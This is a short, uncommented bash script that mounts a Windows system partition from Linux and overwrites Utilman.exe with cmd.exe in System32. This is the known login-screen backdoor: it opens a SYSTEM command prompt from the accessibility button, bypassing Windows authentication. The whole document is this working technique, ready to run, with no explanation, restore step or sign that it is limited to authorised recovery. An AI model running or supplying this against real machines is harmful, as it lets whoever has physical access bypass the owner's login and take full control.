#!/bin/bash

fdisk -l

ntfs-3g /dev/sdaX /mnt/windows

cd /mnt/windows/Windows/System32 \
    && mv -v Utilman.exe Utilman.exe.or \
    && cp cmd.exe Utilman.exe
